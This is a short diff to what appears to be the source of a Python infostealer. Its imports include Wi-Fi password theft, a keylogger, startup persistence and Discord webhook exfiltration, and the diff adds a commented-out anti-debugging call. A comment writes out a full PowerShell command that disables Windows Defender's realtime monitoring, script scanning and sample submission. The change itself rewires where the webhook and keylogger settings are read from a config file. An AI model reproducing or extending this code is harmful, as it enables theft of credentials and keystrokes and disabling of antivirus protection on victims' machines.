@@ -4,6 +4,7 @@ from modules.info import start
 from modules.wifi import WifiPasswords
 from modules.keylogger import Keylogger
 from modules.startup import StartUp
+#from modules.antidebug import Antidebug
 from tkinter import messagebox
 import zipfile
 import subprocess
@@ -12,6 +13,8 @@ from discord import File, SyncWebhook
 import socket
 import requests
 
+
+#Antidebug()
 
 def disable_defender():
     #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
@@ -27,8 +30,8 @@ try:
     with open("todo.txt", "r") as f:
         lines = f.readlines()
         webhook = lines[0].strip()
-        keylogger = lines[2].strip()
-        Startup = lines[3]#.strip()
+        keylogger = lines[3].strip()
+        Startup = lines[4]#.strip()
         f.close()
 except:
     webhook = "null"
